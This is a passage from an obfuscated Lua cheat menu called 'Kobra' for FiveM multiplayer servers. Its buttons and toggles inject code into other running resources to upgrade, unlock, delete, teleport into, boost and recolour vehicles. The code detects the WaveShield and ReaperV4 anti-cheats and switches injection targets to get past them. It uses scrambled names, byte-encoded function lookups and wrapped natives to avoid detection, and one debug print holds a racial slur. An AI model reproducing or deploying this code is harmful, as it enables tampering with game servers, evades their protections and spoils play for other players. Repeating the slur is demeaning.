                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v449=0 -0 ;local v450;local v451;while true do if (v449==(0 -0)) then v12:Notify("success","Kobra","Vehicle Max Upgraded",8526 -5526 );v450=GetResourceState("WaveShield")=="started" ;v449=1;end if (v449==1) then v451=GetResourceState("ReaperV4")=="started" ;if v450 then local v876=0 + 0 ;while true do if (v876==(0 -0)) then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end elseif v451 then local v977=0;while true do if (v977==(0 -0)) then print("using Reaper fallback");MachoInjectThread(0 -0 ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v452=0 -0 ;while true do if (v452==(265 -(34 + 231))) then v12:Notify("success","Kobra","Deleted Vehicle",4317 -(930 + 387) );MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v453=0 + 0 ;while true do if (v453==(0 -0)) then v12:Notify("success","Kobra","Deleted Vehicle",3697 -(389 + 308) );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() local v454=0 -0 ;while true do if (v454==(0 -0)) then v12:Notify("success","Kobra","Teleported into Vehicle",1192 + 1808 );MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);break;end end end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v455) if v455 then v12:Notify("success","Kobra","Boost Vehicle On",3997 -(339 + 658) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end else local v585=0 -0 ;while true do if (v585==(0 -0)) then v12:Notify("error","Kobra","Boost Vehicle Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v456) local v457=GetResourceState("WaveShield")=="started" ;local v458=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v456 then if v457 then local v801=0 + 0 ;while true do if ((0 + 0)==v801) then v12:Notify("success","Kobra","Instant Brakes On",11218 -8218 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v802=0 -0 ;while true do if (v802==0) then v48(v458,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",1984 + 1016 );break;end end end elseif v457 then local v803=0;while true do if (v803==(249 -(197 + 52))) then v12:Notify("success","Kobra","Instant Brakes Off",6458 -3458 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else v48(v458,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",6832 -3832 );end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v459) local v460=GetResourceState("WaveShield")=="started" ;local v461=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v459 then if v460 then local v804=0 + 0 ;while true do if (v804==(0 -0)) then v12:Notify("success","Kobra","Easy Handling On",3000);MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v805=0 -0 ;while true do if (v805==(0 -0)) then v48(v461,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",1162 + 1838 );break;end end end elseif v460 then v12:Notify("success","Kobra","Easy Handling Off",4196 -1196 );MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);else v48(v461,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3000);end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v462) local v463=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v462 then local v586=1097 -(97 + 1000) ;while true do if (v586==0) then v12:Notify("success","Kobra","Rainbow Vehicle On",3000);if (GetResourceState("WaveShield")=="started") then print("souygdfg");v48(v463,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);else v48(v463,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
